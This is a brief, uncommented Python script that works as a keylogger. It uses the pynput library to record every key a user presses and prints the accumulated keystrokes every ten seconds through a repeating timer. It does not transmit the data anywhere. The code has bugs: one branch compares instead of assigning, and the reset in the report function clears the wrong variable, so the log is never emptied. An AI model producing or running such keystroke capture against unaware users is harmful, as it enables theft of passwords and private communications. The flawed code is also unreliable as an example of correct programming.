import pynput.keyboard
import threading
keyboard_listener=pynput.keyboard

keys=""

def process_keys(key):
	global keys
	try:
		keys = keys + str(key.char)
	except AttributeError:
		if key==key.space:
			keys = keys + " "
		elif key == key.enter:
			keys = keys + ""
		elif key == key.right:
			keys = keys + ""
		elif key == key.left:
			keys == keys + ""
		elif key == key.up:
			keys = keys + ""
		elif key == key.down:
			keys = keys + ""
		else:
			keys = keys + " " + str(key) + " "
def report():
	global keys
	print(keys)
	key=""
	timer=threading.Timer(10,report)
	timer.start()

keyboard_listener=pynput.keyboard.Listener(on_press=process_keys)
with keyboard_listener:
	report()
	keyboard_listener.join()